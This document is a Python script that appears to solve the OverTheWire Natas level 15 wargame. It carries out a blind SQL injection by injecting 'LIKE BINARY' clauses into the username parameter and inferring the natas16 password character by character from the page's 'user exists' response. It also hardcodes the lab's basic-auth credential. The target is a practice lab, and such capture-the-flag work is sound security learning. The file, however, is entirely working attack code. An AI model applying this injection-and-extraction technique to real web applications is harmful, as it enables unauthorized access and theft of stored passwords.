import requests, base64

basic_auth = 'natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'.encode()
url = 'http://natas15.natas.labs.overthewire.org'
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
b64_auth = base64.b64encode(basic_auth).decode('utf-8')
header = { 'Authorization': 'Basic {0}'.format(b64_auth) }

def connect():
    resp = requests.get(url, headers=header)
    if resp.status_code != requests.codes.ok:
        print('Can\'t connect')
    else:
        print("Connected!")
    return resp

def discover_charset(resp):
    discovered_charset = ''
    if resp.status_code != requests.codes.ok:
        return -1
    print("Attempting to discover charset for brute force attempt..")
    for char in chars:
        r = requests.get(url + '?username=natas16" AND password LIKE BINARY "%' + char + '%" "', headers=header)
        #print(r.content)
        if "This user exists".encode() in  r.content:
            discovered_charset += char
            print(discovered_charset)
    print("Final charset is: " + discovered_charset)
    print("Length: " + str(len(discovered_charset)))
    print("maximum attempts to bruteforce 32 char key: " + str((len(discovered_charset) * 32)))
    print("maximum if full charset :" + str((len(chars) * 32)))
    print("Note: probability is based on being able to brute each character indivudally")
    return discovered_charset

def bruteforce(resp, charset):
    password = ''
    if resp.status_code != requests.codes.ok:
        return -1
    print("Attempting bruteforce of password!")
    for i in range(32):
        for char in charset:
            r = requests.get(url + '?username=natas16" AND password LIKE BINARY "' + password + char + '%" "', headers=header)
            if "This user exists".encode() in r.content:
                password += char
                print("Password: " + password + '*' * int(32 - len(password)))
    return password

resp = connect()
#d_charset = discover_charset(resp)
d_charset = '03569acehijmnpqtwBEHINORW'
password = bruteforce(resp, d_charset)
print("Password for natas16 is " + password)


